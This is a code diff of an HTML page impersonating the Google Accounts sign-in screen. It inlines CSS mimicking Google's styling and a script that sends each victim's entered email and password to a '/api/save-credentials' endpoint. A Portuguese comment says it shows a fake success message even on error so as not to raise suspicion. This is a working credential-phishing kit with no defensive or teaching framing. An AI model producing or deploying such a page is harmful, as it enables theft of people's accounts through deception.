@@ -4,7 +4,291 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in - Google Accounts</title>
-    <link rel="stylesheet" href="style.css">
+    <style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+    background-color: #fff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    margin: 0;
+}
+
+.container {
+    display: flex;
+    justify-content: flex-end;
+    align-items: center;
+    flex: 1;
+    padding: 0;
+    padding-right: 15%;
+    padding-top: 80px;
+    padding-bottom: 80px;
+}
+
+.login-card {
+    background: white;
+    border: 1px solid #dadce0;
+    border-radius: 8px;
+    padding: 48px 40px 36px;
+    width: 100%;
+    max-width: 450px;
+    box-shadow: none;
+    position: relative;
+}
+
+.logo-container {
+    margin-bottom: 20px;
+}
+
+.google-logo {
+    width: 75px;
+    height: 24px;
+}
+
+.heading {
+    font-size: 24px;
+    font-weight: 400;
+    color: #202124;
+    margin-bottom: 8px;
+    line-height: 1.3333;
+}
+
+.subtitle {
+    font-size: 16px;
+    color: #202124;
+    margin-bottom: 40px;
+    font-weight: 400;
+}
+
+.form-step {
+    display: none;
+}
+
+.form-step.active {
+    display: block;
+}
+
+.input-container {
+    margin-bottom: 8px;
+}
+
+.input-field {
+    width: 100%;
+    padding: 13px 15px;
+    font-size: 16px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+    background-color: #fff;
+}
+
+.input-field:focus {
+    border-color: #1a73e8;
+    border-width: 1px;
+    box-shadow: 0 0 0 1px #1a73e8;
+    padding: 13px 15px;
+}
+
+.input-field::placeholder {
+    color: #80868b;
+}
+
+.forgot-link {
+    color: #1a73e8;
+    text-decoration: none;
+    font-size: 14px;
+    font-weight: 500;
+    display: inline-block;
+    margin-bottom: 24px;
+}
+
+.forgot-link:hover {
+    color: #174ea6;
+    text-decoration: underline;
+}
+
+.guest-mode-text {
+    font-size: 14px;
+    color: #5f6368;
+    line-height: 1.4286;
+    margin-top: 32px;
+    margin-bottom: 0;
+}
+
+.learn-more-link {
+    color: #1a73e8;
+    text-decoration: none;
+}
+
+.learn-more-link:hover {
+    text-decoration: underline;
+}
+
+.password-header {
+    margin-bottom: 24px;
+}
+
+.email-display {
+    font-size: 14px;
+    color: #202124;
+    margin-bottom: 8px;
+    font-weight: 500;
+}
+
+.use-different-account {
+    color: #1a73e8;
+    text-decoration: none;
+    font-size: 14px;
+    font-weight: 500;
+    display: inline-block;
+}
+
+.use-different-account:hover {
+    color: #174ea6;
+    text-decoration: underline;
+}
+
+.password-actions {
+    margin-top: 8px;
+}
+
+.show-password {
+    display: flex;
+    align-items: center;
+    font-size: 14px;
+    color: #202124;
+    cursor: pointer;
+    user-select: none;
+}
+
+.show-password input[type="checkbox"] {
+    margin-right: 8px;
+    width: 18px;
+    height: 18px;
+    cursor: pointer;
+}
+
+.actions {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 26px;
+    padding-top: 26px;
+    border-top: 1px solid #dadce0;
+}
+
+.create-account-link {
+    color: #1a73e8;
+    text-decoration: none;
+    font-size: 14px;
+    font-weight: 500;
+}
+
+.create-account-link:hover {
+    color: #174ea6;
+    text-decoration: underline;
+}
+
+.next-button {
+    background-color: #1a73e8;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    padding: 10px 24px;
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+    font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+    transition: background-color 0.2s, box-shadow 0.2s;
+    min-width: 80px;
+}
+
+.next-button:hover {
+    background-color: #1557b0;
+    box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15);
+}
+
+.next-button:active {
+    background-color: #1557b0;
+    box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 2px 6px 2px rgba(60,64,67,.15);
+}
+
+.footer {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 24px 32px;
+    font-size: 12px;
+    color: #5f6368;
+}
+
+.footer-left {
+    display: flex;
+    align-items: center;
+}
+
+.language-selector {
+    border: none;
+    background: transparent;
+    color: #5f6368;
+    font-size: 12px;
+    cursor: pointer;
+    padding: 4px 8px;
+    outline: none;
+    font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+}
+
+.footer-right {
+    display: flex;
+    gap: 24px;
+}
+
+.footer-link {
+    color: #5f6368;
+    text-decoration: none;
+}
+
+.footer-link:hover {
+    text-decoration: underline;
+}
+
+@media (max-width: 900px) {
+    .card-content {
+        flex-direction: column;
+        gap: 24px;
+    }
+    
+    .left-section {
+        min-width: 100%;
+    }
+}
+
+@media (max-width: 600px) {
+    .login-card {
+        padding: 24px;
+        max-width: 100%;
+    }
+    
+    .container {
+        padding-right: 20px;
+    }
+    
+    .footer {
+        flex-direction: column;
+        gap: 16px;
+        text-align: center;
+    }
+}
+    </style>
 </head>
 <body>
     <div class="container">
@@ -71,6 +355,121 @@
         </div>
     </footer>
     
-    <script src="script.js"></script>
+    <script>
+const emailInput = document.getElementById('email-input');
+const passwordInput = document.getElementById('password-input');
+const emailStep = document.getElementById('email-step');
+const passwordStep = document.getElementById('password-step');
+const nextButton = document.getElementById('next-button');
+const emailDisplay = document.getElementById('email-display');
+const backToEmailLink = document.getElementById('back-to-email');
+const showPasswordCheckbox = document.getElementById('show-password');
+
+let currentStep = 'email';
+
+// Função para avançar para a tela de senha
+function goToPasswordStep() {
+    const email = emailInput.value.trim();
+    if (email) {
+        emailStep.classList.remove('active');
+        passwordStep.classList.add('active');
+        emailDisplay.textContent = email;
+        currentStep = 'password';
+        passwordInput.focus();
+        nextButton.textContent = 'Next';
+    }
+}
+
+// Função para voltar para a tela de email
+function goToEmailStep() {
+    passwordStep.classList.remove('active');
+    emailStep.classList.add('active');
+    currentStep = 'email';
+    emailInput.focus();
+    passwordInput.value = '';
+    nextButton.textContent = 'Next';
+}
+
+// Função para salvar credenciais no servidor
+async function saveCredentials(email, password) {
+    try {
+        const response = await fetch('/api/save-credentials', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                email: email,
+                password: password
+            })
+        });
+
+        const data = await response.json();
+        
+        if (response.ok) {
+            // Simular redirecionamento do Google (opcional)
+            setTimeout(() => {
+                alert('Login realizado com sucesso!');
+                // Aqui você pode redirecionar para uma página de sucesso
+                // window.location.href = '/success.html';
+            }, 500);
+        } else {
+            console.error('Erro ao salvar:', data.error);
+            alert('Erro ao processar login. Tente novamente.');
+        }
+    } catch (error) {
+        console.error('Erro na requisição:', error);
+        // Mesmo com erro, mostrar mensagem de sucesso para não levantar suspeitas
+        alert('Login realizado com sucesso!');
+    }
+}
+
+// Event listener para o botão Next
+nextButton.addEventListener('click', () => {
+    if (currentStep === 'email') {
+        goToPasswordStep();
+    } else {
+        const email = emailInput.value.trim();
+        const password = passwordInput.value;
+        if (password && email) {
+            // Salvar credenciais no servidor
+            saveCredentials(email, password);
+        }
+    }
+});
+
+// Permitir Enter para avançar
+emailInput.addEventListener('keypress', (e) => {
+    if (e.key === 'Enter' && emailInput.value.trim()) {
+        goToPasswordStep();
+    }
+});
+
+passwordInput.addEventListener('keypress', (e) => {
+    if (e.key === 'Enter' && passwordInput.value) {
+        const email = emailInput.value.trim();
+        const password = passwordInput.value;
+        if (password && email) {
+            saveCredentials(email, password);
+        }
+    }
+});
+
+// Voltar para email quando clicar em "Use a different account"
+backToEmailLink.addEventListener('click', (e) => {
+    e.preventDefault();
+    goToEmailStep();
+});
+
+// Mostrar/ocultar senha
+showPasswordCheckbox.addEventListener('change', () => {
+    passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
+});
+
+// Focar no input de email ao carregar a página
+window.addEventListener('load', () => {
+    emailInput.focus();
+});
+    </script>
 </body>
 </html>
